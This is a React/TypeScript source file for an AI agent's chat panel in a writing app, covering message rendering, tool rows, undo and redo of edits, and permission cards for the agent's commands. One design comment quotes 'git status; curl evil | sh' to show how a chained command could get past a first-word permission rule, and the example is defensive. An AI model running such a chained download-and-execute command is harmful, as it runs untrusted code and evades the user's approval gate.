              className="nx-send"
              aria-label="Send"
              data-testid="send"
              disabled={!draft.trim()}
              onClick={send}
            >
              <SendIcon size={14} />
            </Pressable>
          </div>
        </div>
      </div>
      {/* The column's foot, level with the strips under the source and the
          preview: what the project's conversations have cost so far, and
          the way to the breakdown at the foot of the past conversations.
          The sum follows the end of each turn, as `usage` does. */}
      <div
        className="nx-foot t-meta flex h-7 shrink-0 items-center gap-3 px-3 text-ink-2"
        data-testid="agent-foot"
      >
        <span className="tnum truncate" data-testid="agent-tally">{tally(usage?.usage)}</span>
        <span className="flex-1" />
        <Pressable
          className="hover:text-ink"
          data-testid="usage-open"
          title="What this project's conversations have cost, in full"
          onClick={() => {
            setConfirmClear(false);
            setView("past");
          }}
        >
          Usage
        </Pressable>
      </div>
      </>
      ) : null}
    </div>
  );
}

/** The foot's sum: "12 turns, $0.42".  Two decimals, since the foot is a
 *  glance and the past conversations' line has the third.  Nothing before
 *  the first turn: "0 turns, $0.00" said nothing a writer needed, in every
 *  project that had not yet had a conversation. */
export function tally(usage: { turns: number; costUsd: number } | undefined): string {
  if (!usage || usage.turns === 0) return "";
  const turns = `${usage.turns} ${usage.turns === 1 ? "turn" : "turns"}`;
  return `${turns}, $${usage.costUsd.toFixed(2)}`;
}

/** A path or a command, cut to something that fits a 32px header beside
 *  the agent's name.  The tail of a path is the part that identifies it. */
function shorten(text: string, limit = 28): string {
  let line = text.split("\n")[0].trim();
  // A path in the working line is the file's name: the header has room
  // for "Read 02_theory.tex" beside four buttons and Stop, and the
  // transcript's row carries the whole path.
  if (/^[\w.@/-]+$/.test(line) && line.includes("/")) line = line.slice(line.lastIndexOf("/") + 1);
  if (line.length <= limit) return line;
  const tail = line.slice(-(limit - 1));
  return line.includes("/") ? `…${tail}` : `${line.slice(0, limit - 1)}…`;
}

/** Tools that are plumbing rather than work: showing them is noise.
 *
 *  `TodoWrite` used to be in here and is not plumbing. It is the model
 *  saying what it intends to do next, and it never reaches this function
 *  now: the store takes it before a tool row is made and turns it into the
 *  turn's plan, replaced in place as later calls revise it. `ToolSearch`
 *  genuinely is plumbing, and stays. */
const HIDDEN_TOOLS = new Set(["ToolSearch"]);

const Item = memo(function Item({
  item,
  onShowEdit,
  onHoverEdit,
}: {
  item: ShownItem;
  onShowEdit: (path: string, line: number) => void;
  onHoverEdit: (path: string, range: [number, number] | null) => void;
}) {
  if (item.kind === "user") {
    // The writer's words as a plain card on the first surface, with no
    // stripe: the stripe is the agent's.
    return (
      <div className="t-ui whitespace-pre-wrap rounded-card bg-surface px-3 py-2 text-ink">
        {item.text}
      </div>
    );
  }

  if (item.kind === "claude") {
    return <AgentMessage item={item} />;
  }

  if (item.kind === "tools") {
    return <ToolRun group={item} />;
  }

  if (item.kind === "tool") {
    return <ToolRow item={item} />;
  }

  // A full stop in the record, not a row. It exists so the replay can tell
  // an interrupted turn from a finished one.
  if (item.kind === "turn_end") return null;

  if (item.kind === "plan") {
    return <Plan item={item} />;
  }

  if (item.kind === "notice") {
    return (
      <div className={`text-compact leading-4.5 ${item.tone === "error" ? "text-error" : "text-ink-3"}`}>
        {item.text}
      </div>
    );
  }

  if (item.kind === "edit") {
    return <EditChip item={item} onShowEdit={onShowEdit} onHoverEdit={onHoverEdit} />;
  }

  return <Permission item={item} />;
})

/** A run of tool calls as one sentence, opening to its rows. */
function ToolRun({ group }: { group: ToolGroup }) {
  const [open, setOpen] = useState(false);
  return (
    <div className="nx-tool-run" data-testid="tool-run" data-open={open || undefined}>
      <Pressable
        type="button"
        className={`nx-tool-line ${group.ok ? "" : "text-error"}`}
        aria-expanded={open}
        onClick={() => setOpen((was) => !was)}
      >
        {open ? <ChevronDownIcon size={12} /> : <ChevronRightIcon size={12} />}
        <span className="min-w-0 flex-1 truncate">{foldedSentence(group)}</span>
        {group.ms != null && group.ms >= 500 ? (
          <span className="shrink-0 tabular-nums">{duration(group.ms)}</span>
        ) : null}
      </Pressable>
      {open ? (
        <div className="flex flex-col gap-0.5 pl-4.5">
          {group.items.map((row) => <ToolRow key={row.id} item={row} />)}
        </div>
      ) : null}
    </div>
  );
}

function ToolRow({ item }: { item: Extract<ChatItem, { kind: "tool" }> }) {
  // While its card is open the card is the whole account: its headline
  // names the call, and a "Running" row above it said the same thing
  // twice. The row comes back with the answer on it.
  if (item.card && !item.card.decision) return null;
  {
    // Which tense the row may use. A call whose card is open has not
    // happened, and one the writer refused never will.
    const state: CallState = item.card
      ? item.card.decision === "deny" || item.card.decision === "expired"
        ? "refused"
        : item.card.decision
          ? "done"
          : "asking"
      : "done";
    const answered = item.card?.decision;
    return (
      <div
        className="nx-tool-line"
        // The account of what was done, on the row the answer belongs to.
        // Folding a decided card into its call is what stops the command
        // being printed twice, and the decision has to come with it: at
        // the quiet positions this row is the only record that the action
        // happened at all.
        data-testid={answered ? `decided-${answered}` : undefined}
      >
        <span className={item.ok === false || state === "refused" ? "text-error" : ""}>
          {verbFor(item.name, state)}
        </span>
        <span className="t-code-sm min-w-0 truncate">{item.summary}</span>
        {answered && answered !== "allow" ? (
          <span className="shrink-0">{decisionWords(answered)}</span>
        ) : null}
        {item.repeats && item.repeats > 1 ? (
          <span className="tabular-nums">×{item.repeats}</span>
        ) : null}
        {/* What it cost, and only once it is worth reading.  A duration on
            every row would be a column of "0.0s" down the transcript;
            half a second is where a reader starts to care, and it turns
            the tool rows from a list of verbs into a record of where a
            turn actually went. */}
        {item.ms != null && item.ms >= 500 ? (
          <span className="ml-auto shrink-0 tabular-nums">
            {duration(item.ms)}
          </span>
        ) : null}
      </div>
    );
  }
}

/** How long the thing on screen has been going, once that is worth saying.
 *
 *  Not a spinner, and section 6 of the design specification forbids one for
 *  a reason this respects rather than works around: an indicator shown at
 *  0ms on a fast task is what tells the reader the task is slow. So this
 *  appears only after three seconds, which is the same argument as the
 *  compile hairline's 400ms threshold applied to a tool call, and it is a
 *  tabular integer that counts rather than anything that moves. Nothing
 *  goes on the wire for it: one timestamp arrives with the event and the
 *  subtraction happens here.
 *
 *  A reserved minimum width, because the status strip's rule against
 *  reflow applies to any number that changes under the eye, and this one
 *  sits beside a truncating label in a 32px bar.
 */
function Elapsed({
  since,
  parenthesised = false,
}: {
  since: number | null;
  parenthesised?: boolean;
}) {
  const [now, setNow] = useState(() => Date.now());
  useEffect(() => {
    if (since === null) return;
    setNow(Date.now());
    const timer = window.setInterval(() => setNow(Date.now()), 1000);
    return () => window.clearInterval(timer);
  }, [since]);
  if (since === null) return null;
  const seconds = Math.floor((now - since) / 1000);
  if (seconds < 3) return null;
  return (
    <span
      className="t-micro shrink-0 text-right tabular-nums text-ink-3"
      style={{ minWidth: "3ch" }}
    >
      {parenthesised ? "(" : ""}
      {seconds < 60
        ? `${seconds}s`
        : `${Math.floor(seconds / 60)}m${String(seconds % 60).padStart(2, "0")}`}
      {parenthesised ? ")" : ""}
    </span>
  );
}

/** The model's plan for this turn.
 *
 *  `TodoWrite` was in `HIDDEN_TOOLS` as plumbing, so the one thing the
 *  agent writes to say what it intends to do next arrived on the wire and
 *  was thrown away. It is the clearest answer anybody has found to "what is
 *  this thing doing for the next minute", and it costs nothing to show
 *  because the data was already here.
 *
 *  Drawn as rows rather than a card: a 3px stripe per item, `--ok` for what
 *  is done, `--pen` for the one in hand and `--line` for what is still to
 *  come, which is the same vocabulary the transcript already uses for a
 *  message and a gate. No checkbox glyphs, because they invite a click that
 *  does nothing.
 */
function Plan({ item }: { item: Extract<ChatItem, { kind: "plan" }> }) {
  const done = item.items.filter((entry) => entry.state === "done").length;
  return (
    <div className="nx-plan stream-indent">
      <div className="nx-plan-head">
        <span>Plan</span>
        <span className="ml-auto tabular-nums">{done} of {item.items.length}</span>
      </div>
      {item.items.map((entry, index) => (
        <div key={index} className="nx-plan-row" data-state={entry.state}>
          {entry.text}
        </div>
      ))}
    </div>
  );
}

/** A duration a person reads, not a number of milliseconds.
 *
 *  Sans with tabular figures rather than mono: the mono rule is for a
 *  literal string the machine produced or consumes, and an elapsed time is
 *  numeric metadata. */
export function duration(ms: number): string {
  if (ms < 1000) return `${ms}ms`;
  if (ms < 60_000) return `${(ms / 1000).toFixed(1)}s`;
  const minutes = Math.floor(ms / 60_000);
  return `${minutes}m ${Math.round((ms % 60_000) / 1000)}s`;
}

function AgentMessage({ item }: { item: Extract<ChatItem, { kind: "claude" }> }) {
  const name = agentName(useStore((s) => s.agent?.provider));
  // The caret is solid while tokens are arriving and blinks once they stop,
  // so a paused generation looks different from a finished one.
  const [paused, setPaused] = useState(false);
  useEffect(() => {
    if (!item.streaming) return;
    setPaused(false);
    const timer = window.setTimeout(() => setPaused(true), 900);
    return () => window.clearTimeout(timer);
  }, [item.text, item.streaming]);

  return (
    <div className="nx-turn-wrap flex" tabIndex={0} data-testid="agent-turn">
      <div className="nx-turn min-w-0 flex-1">
        {/* No name over the reply: the pen rule says whose it is, as the
            column's header and the pen everywhere else already do, and a
            name on every turn was a third of a short exchange's lines.
            A screen reader still hears it. The time floats at the first
            line's end, kept in the layout and shown only under the
            pointer or focus, so the prose never reflows as it appears. */}
        <span className="sr-only">{name}</span>
        <span className="nx-turn-time t-meta tnum" data-testid="turn-time">
          {new Date(item.at).toLocaleTimeString([], {
            hour: "2-digit",
            minute: "2-digit",
          })}
        </span>
        <div className="t-prose text-ink">
          <Prose text={item.text} />
          {item.streaming ? (
            <span
              className={`ml-px inline-block h-[1.1em] w-0.5 translate-y-0.5 bg-pen ${
                paused ? "caret-paused" : ""
              }`}
            />
          ) : null}
        </div>
      </div>
    </div>
  );
}

function EditChip({
  item,
  onShowEdit,
  onHoverEdit,
}: {
  item: Extract<ChatItem, { kind: "edit" }>;
  onShowEdit: (path: string, line: number) => void;
  onHoverEdit: (path: string, range: [number, number] | null) => void;
}) {
  const [open, setOpen] = useState(false);
  const [undoable, setUndoable] = useState(true);
  const name = item.path.split("/").pop() ?? item.path;

  const patch = useMemo(
    () =>
      open
        ? createTwoFilesPatch(name, name, item.before, item.after, "", "", {
            context: 2,
          })
        : "",
    [open, item.before, item.after, name],
  );

  const changedLine = useMemo(
    () => firstChangedLine(item.before, item.after),
    [item.before, item.after],
  );

  if (item.state === "reverted") {
    return <Reverted item={item} name={name} />;
  }

  return (
    <div className="stream-indent" data-testid="edit-chip">
      <div
        className="nx-diff"
        onMouseEnter={() => onHoverEdit(item.path, [changedLine, changedLine + 2])}
        onMouseLeave={() => onHoverEdit(item.path, null)}
      >
        <Pressable
          className="flex min-w-0 items-center gap-1.5 text-ink"
          aria-expanded={open}
          onClick={() => setOpen(!open)}
        >
          {open ? <ChevronDownIcon size={11} /> : <ChevronRightIcon size={11} />}
          <span className="t-code-sm truncate">{name}</span>
        </Pressable>
        <span className="nx-diff-counts">
          <span className="text-ok">+{item.added}</span>
          {item.removed ? <span className="text-error">−{item.removed}</span> : null}
        </span>
        <span className="flex shrink-0 gap-2">
          <Pressable
            className="text-ink-2 hover:text-ink"
            onClick={() => onShowEdit(item.path, changedLine)}
          >
            Show
          </Pressable>
          {undoable ? (
            <Pressable
              className="text-ink-2 hover:text-ink"
              onClick={async () => {
                const projectId = get().projectId;
                if (!projectId) return;
                const result = await api.undo(
                  projectId,
                  item.path,
                  item.before,
                  item.after,
                  item.id,
                );
                if (result.ok) markReverted(item.id);
                else setUndoable(false);
              }}
            >
              Undo
            </Pressable>
          ) : (
            <span className="t-micro text-ink-3">Can’t undo, you edited this</span>
          )}
        </span>
      </div>
      {open ? <Patch text={patch} /> : null}
    </div>
  );
}

function Reverted({
  item,
  name,
}: {
  item: Extract<ChatItem, { kind: "edit" }>;
  name: string;
}) {
  // Redo stays live for ten seconds.  After that the reverted line remains
  // in the transcript for good: the chat is the record of what was done to
  // the document, and nothing in it disappears.
  const [canRedo, setCanRedo] = useState(true);
  useEffect(() => {
    const timer = window.setTimeout(() => setCanRedo(false), 10000);
    return () => window.clearTimeout(timer);
  }, []);

  return (
    <div className="flex h-5 items-center gap-3 stream-indent">
      <span className="t-micro text-ink-3 line-through">Reverted: {name}</span>
      {canRedo ? (
        <Pressable
          className="t-micro text-ink-2 hover:text-ink"
          onClick={async () => {
            const projectId = get().projectId;
            if (!projectId) return;
            const result = await api.undo(
              projectId, item.path, item.after, item.before, item.id, "live",
            );
            if (result.ok) markLive(item.id);
            else setCanRedo(false);
          }}
        >
          Redo
        </Pressable>
      ) : null}
    </div>
  );
}

function Permission({ item }: { item: Extract<ChatItem, { kind: "permission" }> }) {
  const [armed, setArmed] = useState(false);

  // 350ms input shield: a card that appears under a cursor already moving
  // toward the composer must not be approvable on the way past.  The
  // buttons are really disabled for that moment rather than silently
  // ignoring the click -- a control that looks live and does nothing reads
  // as a broken app, and this one guards the fence.
  useEffect(() => {
    const timer = window.setTimeout(() => setArmed(true), 350);
    return () => window.clearTimeout(timer);
  }, []);

  const decide = async (
    decision: "allow" | "always" | "conversation" | "deny",
  ) => {
    if (!armed) return;
    const projectId = get().projectId;
    if (!projectId) return;
    resolvePermission(item.id, decision);
    try {
      await api.respond(projectId, item.id, decision);
    } catch (error: any) {
      set({ error: error.message });
    }
  };

  // The hotkeys belong to the card, not the window.  CodeMirror's content is
  // a contenteditable div, so a window-level handler that only excludes
  // inputs would let ordinary typing in the editor answer the card.
  const card = useRef<HTMLDivElement | null>(null);
  // Which of the two remembering answers is under the cursor, so the
  // line can say what that one remembers.  They remember the same rule
  // for different lengths of time, and the difference is the whole
  // reason there are two of them.
  const [scope, setScope] = useState<"" | "always" | "conversation">("");
  useEffect(() => {
    if (item.decision) return;
    const timer = window.setTimeout(() => {
      // Only take focus if nothing is being typed into.  Pulling the caret
      // out of the editor mid-sentence would make the writer's next "a" or
      // "d" answer a card they have not read -- which is the exact thing
      // the 350 ms shield exists to prevent.
      const active = document.activeElement as HTMLElement | null;
      const typing =
        active?.closest(".cm-editor") ||
        active?.tagName === "TEXTAREA" ||
        active?.tagName === "INPUT";
      // `preventScroll`, because the panel has its own idea of where it
      // should be: the pin-to-bottom effect runs on every change, and a
      // focus that also scrolls means two authorities moving the same
      // container in one frame, which the reader sees as a jump.
      if (!typing) card.current?.focus({ preventScroll: true });
    }, 350);
    return () => window.clearTimeout(timer);
  }, [item.decision]);

  if (item.decision) {
    // Three states, not two.  An action nobody was asked about is not the
    // same as one the writer allowed, and the record should not read as
    // though they had.  The dot is --warn, the permission card's own
    // colour, so the association is already built.
    // Four states, not three. An action nobody was asked about is not the
    // same as one the writer allowed, and an answer that lasts as long as
    // this conversation is not the same as a rule they set for good: the
    // record has to be able to say which, because the last of those is the
    // one they will go looking for in their settings later.
    const label = decisionWords(item.decision);
    const dot =
      item.decision === "deny"
        ? "bg-ink-3"
        : item.decision === "auto"
          ? "bg-warn"
          : "bg-ok";
    return (
      <div
        className="flex h-6.5 items-center gap-2 stream-indent"
        data-testid={`decided-${item.decision}`}
      >
        <span className={`h-1.5 w-1.5 rounded-full ${dot}`} />
        {/* Separated by space rather than by punctuation, which is the
            status strip's own rule. The separator here used to be a dash,
            the sweep made it a comma, and a comma before a monospaced run
            has visibly less air than the dash had: `Denied, latexmk -C`
            read as one word. Space is the right answer and was all along. */}
        <span className="t-micro shrink-0 text-ink-3">
          {label}
          {item.repeats && item.repeats > 1 ? (
            <span className="tabular-nums"> ×{item.repeats}</span>
          ) : null}
        </span>
        <span className="t-micro min-w-0 truncate text-ink-3">
          {item.detail ? (
            <span className="t-code-sm">{item.detail}</span>
          ) : (
            item.headline
          )}
        </span>
      </div>
    );
  }

  return (
    <div
      ref={card}
      data-testid="permission-card"
      tabIndex={0}
      role="group"
      aria-label={item.headline}
      // No focus ring: the global one is --pen, and a violet perimeter on a
      // card whose whole point is a --warn gate says "Claude is talking" at
      // the moment it should say "this needs an answer".
      className="stream-indent permission-card flex rounded-card bg-surface"
      style={{ animation: "permission-in 90ms var(--ease)" }}
      onKeyDown={(event) => {
        if (event.key === "a" && !event.shiftKey) decide("allow");
        if (event.key === "A" && event.shiftKey && item.rule) decide("always");
        if ((event.key === "c" || event.key === "C") && item.rule) {
          decide("conversation");
        }
        if (event.key === "d") decide("deny");
      }}
    >
      <span className="w-0.75 shrink-0 rounded-l-card bg-warn" />
      <div className="min-w-0 flex-1 px-3 py-2.5">
        <div className="t-ui font-medium text-ink">{item.headline}</div>
        {item.detail ? (
          <pre className="t-code-sm mt-2 max-h-27 overflow-auto whitespace-pre-wrap rounded-control bg-surface-2 p-2 text-ink-2">
            {item.detail}
          </pre>
        ) : null}
        {item.consequence ? (
          <div className="t-meta mt-2 text-ink-2">{item.consequence}</div>
        ) : null}
        {/* Why this one stopped, which only has an answer worth reading when
            auto mode is on and something held the call back regardless.
            With the switch off the answer is that this app asks before it
            acts, and printing that on every card is how people learn to stop
            reading them. */}
        {item.reason ? (
          <div className="t-micro mt-2 text-ink-3">{item.reason}</div>
        ) : null}
        {item.rule ? (
          // Always in the layout, only sometimes visible.  Adding this line
          // on hover grew the card and moved the buttons out from under the
          // cursor that was reaching for them -- and moving away shrank it
          // again, so the pointer oscillated between the two.
          <div
            className={`t-micro mt-2 truncate text-ink-3 transition-opacity duration-[90ms] ${
              scope ? "opacity-100" : "opacity-0"
            }`}
            // Shortened from the front, never the end.  A rule scoped to a
            // file is an absolute path, and the half a 320px panel can show
            // is the half that says nothing -- the filename is the part the
            // writer is agreeing to.  The whole rule is in the tooltip.
            title={item.rule}
            aria-hidden={!scope}
            data-testid="scope-line"
          >
            {scope === "conversation" ? "Until this conversation is cleared: " : "Remembers: "}
            {shortRule(item.rule)}
          </div>
        ) : null}
        {/* `flex-wrap` and `whitespace-nowrap` together, because the panel
            is resizable and the interface text size goes to 135 per cent: a
            label that wraps to two lines inside a box pinned at 28px spills
            out of it, and a row that cannot wrap pushes Deny past the edge
            of the card.  The row gives way now, not the buttons. */}
        {/* The keys are drawn always, as the page draws them: a hint that
            appears on focus moved the buttons out from under the pointer. */}
        <div className="mt-3 flex flex-wrap items-center gap-1.5">
          <Button
            variant="ghost"
            className="shrink-0"
            data-testid="allow"
            disabled={!armed}
            onClick={() => decide("allow")}
          >
            Allow <Kbd>A</Kbd>
          </Button>
          {/* The answer the two remaining gates actually needed. Both of
              the things the middle position still asks about are things a
              turn asks about repeatedly: a run that adds eleven references
              put up eleven identical cards, and neither existing answer
              fitted, since Allow was too little and Allow always was a
              permanent grant nobody wanted to make for one afternoon's
              reading. It is remembered nowhere: a set on the object, gone
              with the conversation and gone with the process. */}
          {item.rule ? (
            <Button
              className="shrink-0"
              data-testid="conversation"
              disabled={!armed}
              onMouseEnter={() => setScope("conversation")}
              onMouseLeave={() => setScope("")}
              onFocus={() => setScope("conversation")}
              onBlur={() => setScope("")}
              onClick={() => decide("conversation")}
            >
              For this conversation <Kbd>C</Kbd>
            </Button>
          ) : null}
          {/* A command carrying shell syntax is remembered by its exact
              text rather than by its first word, because a rule on the word
              would be a promise the fence cannot keep: `Bash:git` would
              cover `git status; curl evil | sh`.  So the button is offered
              here now, and what it remembers is exactly this command. */}
          {item.rule ? (
            <Button
              className="shrink-0"
              data-testid="always"
              disabled={!armed}
              onMouseEnter={() => setScope("always")}
              onMouseLeave={() => setScope("")}
              onFocus={() => setScope("always")}
              onBlur={() => setScope("")}
              onClick={() => decide("always")}
            >
              Allow always <Kbd>⇧A</Kbd>
            </Button>
          ) : null}
          <Button
            className="shrink-0 !text-error"
            data-testid="deny"
            disabled={!armed}
            onClick={() => decide("deny")}
          >
            Deny <Kbd>D</Kbd>
          </Button>
        </div>
      </div>
    </div>
  );
}
